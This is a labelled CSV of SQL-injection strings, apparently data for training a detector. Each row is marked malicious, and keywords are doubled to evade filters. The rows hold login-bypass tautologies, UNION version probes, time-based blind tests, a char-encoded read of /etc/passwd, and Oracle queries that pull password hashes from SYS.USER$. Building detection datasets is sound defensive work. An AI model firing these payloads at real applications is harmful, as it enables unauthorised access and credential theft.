Query,Label
""" oorr pg_sleep  (  __TIME__  )  --",1
creatcreatee user name identified bbyy pass123 tempoorrary ttableablespace temp default ttableablespace users;,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct DiissTiinnCT  (  tatableble_name  )   frfromom   (  seleselectct DiissTiinnCT  (  tatableble_name  )  , ROWNUM AS llimitimit frfromom sys.all_tatablebles  )   wwherehere llimitimit  =  5   )    )    anandd 'i'  =  'i",1
" sselectelect * frfromom users whewherere id  =  '1' oorr @ @1  =  1 union sselectelect 1,version  (    )   -- 1'",1
" seleselectct * frfromom users wherwheree id  =  1 oorr 1#""  (   union seleselectct 1,version  (    )   -- 1",1
 seselectlect name ffromrom syscolumns whewherere id   =     (  seselectlect id ffromrom sysobjects whewherere name   =   tabtablelename'  )  --,1
sselectelect * ffromrom users wherwheree id  =  1 +$+ oorr 1  =  1 -- 1,1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1
" seleselectct * frfromom users wwherehere id  =  '1' oorr ||/1  =  1 union seleselectct 1,version  (    )   -- 1'",1
" sselectelect * frofromm users whewherere id  =  '1' oorr \.<\ union sselectelect 1,@@VERSION -- 1'",1
? oorr 1  =  1 --,1
 )   oorr   (  'a'  =  'a,1
admiinn' oorr 1  =  1#,1
" seleselectct * frfromom users whwhereere id  =  1 oorr ""  (  ]"" oorr 1  =  1 -- 1",1
oorr 1  =  1 --,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   seselectlect DiissTiinnCT  (  column_name  )   frofromm   (  seselectlect DiissTiinnCT  (  column_name  )  , ROWNUM AS lilimitmit frofromm all_tab_columns  )   whwhereere lilimitmit  =  5   )    )    anandd 'i'  =  'i",1
" sselectelect * frofromm users wherwheree id  =  '1' %!<@ union sselectelect 1,version  (    )   -- 1'",1
" selecselectt * frofromm users wwherehere id  =  1 oorr ""&  (  "" oorr 1  =  1 -- 1",1
" sselectelect * ffromrom users whwhereere id  =  1 oorr ""?  (  "" oorr 1  =  1 -- 1",1
diisstiinnct,1
sselectelect * frofromm users whewherere id  =  '1' *  (  \  )   oorr 1  =  1 -- 1',1
"1 anandd aascscii  (  lower  (  substriinng   (    (   seleselectct top 1 name frofromm sysobjects whwhereere xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1
seleselectct * frfromom users wwherehere id  =  1 oorr \.<\ oorr 1  =  1 -- 1,1
"admiinn"" oorr ""1""  =  ""1""--",1
" selselectect * frfromom users wherwheree id  =  1 oorr ""%{"" oorr 1  =  1 -- 1",1
iiinnsertnsert,1
" selselectect * ffromrom users wwherehere id  =  1 oorr 1#""?  =  1 oorr 1  =  1 -- 1",1
" selecselectt * frfromom users wwherehere id  =  1 oorr ""%?"" oorr 1  =  1 -- 1",1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct DiissTiinnCT  (  PASSWoorrD  )   frfromom   (  seleselectct DiissTiinnCT  (  PASSWoorrD  )  , ROWNUM AS limilimitt frfromom SYS.USER$  )   wwherehere limilimitt  =  8   )    )    anandd 'i'  =  'i",1
" sselectelect * ffromrom users whewherere id  =  1 oorr ""?#"" oorr 1  =  1 -- 1",1
"oorr 1  =  1 oorr """"  =  ",1
/**/oorr/**/1/**/  =  /**/1,1
" seselectlect * ffromrom users wherwheree id  =  1 oorr "".  (  "" oorr 1  =  1 -- 1",1
" sselectelect * frfromom users wherwheree id  =  '1' union sselectelect ||/1,version  (    )   -- 1'",1
" seselectlect * ffromrom users whewherere id  =  '1' union seselectlect +\.,@@VERSION -- 1'",1
oorr 1  =  1/*,1
%27 oorr 1  =  1,1
" selecselectt * frfromom users whwhereere id  =  1 <@&@ union selecselectt 1,version  (    )   -- 1",1
" selecselectt * frofromm users wherwheree id  =  '1' union selecselectt $*$,@@VERSION -- 1'",1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1
" sselectelect * frfromom users whewherere id  =  '1' oorr $ 1  =  1 union sselectelect 1,@@VERSION -- 1'",1
selecselectt * frofromm users wwherehere id  =  1 oorr \.<1 oorr 1  =  1 -- 1,1
" selselectect * frofromm users wherwheree id  =  '1' oorr \<\ union selselectect 1,@@VERSION -- 1'",1
" seselectlect * frfromom users wwherehere id  =  1 union seselectlect 1||1,version  (    )   -- 1",1
" selecselectt * frfromom users whewherere id  =  1 ||1 union selecselectt nulnulll,banner frfromom v$version whewherere rownum  =  1 -- 1",1
sselectelect * frfromom users whewherere id  =  '1' oorr \.<\ oorr 1  =  1 -- 1',1
" seleselectct * ffromrom users wherwheree id  =  1 oorr ""]{"" oorr 1  =  1 -- 1",1
" seleselectct * frfromom users wwherehere id  =  1 oorr "".@"" oorr 1  =  1 -- 1",1
" seleselectct * frfromom users wwherehere id  =  1 oorr ""$["" oorr 1  =  1 -- 1",1
oorr 1 --',1
" seselectlect * ffromrom users whewherere id  =  1 oorr "",;"" oorr 1  =  1 -- 1",1
"admiinn"" oorr 1  =  1#",1
" sselectelect * frofromm users wherwheree id  =  1 +  (  1  )   union sselectelect nunullll,banner frofromm v$version wherwheree rownum  =  1 -- 1",1
\x27UNION selselectect,1
PRiinnT,1
" selselectect * frofromm users whewherere id  =  '1' union selselectect   (  \.  )  ,@@VERSION -- 1'",1
oorr 1  =  1--,1
1 oorr pg_sleep  (  __TIME__  )  --,1
" selecselectt * frfromom users wwherehere id  =  1 oorr "",#"" oorr 1  =  1 -- 1",1
admiinn'  )   oorr   (  '1'  =  '1'/*,1
oorr 2 betbetweenween 1 aandnd 3,1
" selecselectt * ffromrom users whewherere id  =  1 oorr ""  )  .""  =  1 oorr 1  =  1 -- 1",1
" seleselectct * frofromm users wwherehere id  =  1 oorr 1#"". union seleselectct nunullll,version  (    )   -- 1",1
admiinn' oorr '1'  =  '1,1
; if nonott  (  seleselectct system_user  )   <> 'sa' waitfoorr delay '0:0:2' --,1
" selselectect * ffromrom users whwhereere id  =  1 union selselectect 1,banner ffromrom v$version whwhereere rownum  =  1 -- 1",1
""" oorr 0  =  0 --",1
" seleselectct * ffromrom users whwhereere id  =  1 union seleselectct @ $_,version  (    )   -- 1",1
sselectelect * frofromm users wwherehere id  =  1 <@.$ oorr 1  =  1 -- 1,1
" seleselectct * frofromm users whewherere id  =  1 oorr ""%."" oorr 1  =  1 -- 1",1
" sselectelect * frfromom users wherwheree id  =  1 + $+*$ union sselectelect nulnulll,@@VERSION -- 1",1
" sselectelect * frfromom users wwherehere id  =  1 oorr "",."" oorr 1  =  1 -- 1",1
char%4039%41%2b%40sselectelect,1
" seleselectct * frfromom users wherwheree id  =  1 oorr ""1&"" oorr 1  =  1 -- 1",1
admiinn'  )   oorr   (  '1'  =  '1,1
